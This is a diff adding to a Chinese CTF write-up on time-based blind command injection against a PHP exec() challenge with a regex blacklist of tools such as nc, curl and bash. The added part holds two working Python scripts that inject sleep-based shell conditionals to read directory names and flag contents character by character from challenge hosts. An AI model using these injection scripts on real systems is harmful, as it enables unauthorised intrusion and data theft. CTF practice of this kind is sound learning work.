@@ -116,7 +116,7 @@ cat flag.php
 
 ^
 ## **延时盲注**
-exec没有回显，并且过滤了curl nc 写文件。
+exec没有回显，并且过滤了. curl nc 写文件。
 ```
 function check($x){
     if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
@@ -128,4 +128,57 @@ if(isset($_GET['c'])){
     check($c);
     exec($c);
 }
+```
+测试ls;sleep 3可以延时。
+延时根目录/
+```
+import requests
+import time
+import string
+str=string.ascii_letters+string.digits+'_~'
+result=""
+for i in range(1,10):#行
+    key=0
+    for j in range(1,15):#列
+        if key==1:
+            break
+        for n in str:
+           #awk 'NR=={0}'逐行输出获取
+           #cut -c {1} 截取单个字符
+            payload="if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i,j,n)
+            #print(payload)
+            url="http://873b2081-3b04-4517-a10d-dcb44382c44c.challenge.ctf.show/?c="+payload
+            try:
+                requests.get(url,timeout=(2.5,2.5))
+            except:
+                result=result+n
+                print(result)
+                break
+            if n=='~':
+                key=1
+                result+=" "
+#找到flag：/f149_15_h3r3
+```
+延时flag文件中内容
+```
+import requests
+import time
+import string
+str=string.digits+string.ascii_lowercase+"-"
+result=""
+key=0
+for j in range(1,45):
+    print(j)
+    if key==1:
+        break
+    for n in str:
+        payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
+        #print(payload)
+        url="http://b76bf2c7-70e7-401f-a490-f5963e74b581.challenge.ctf.show/?c="+payload
+        try:
+            requests.get(url,timeout=(2.5,2.5))
+        except:
+            result=result+n
+            print(result)
+            break
 ```
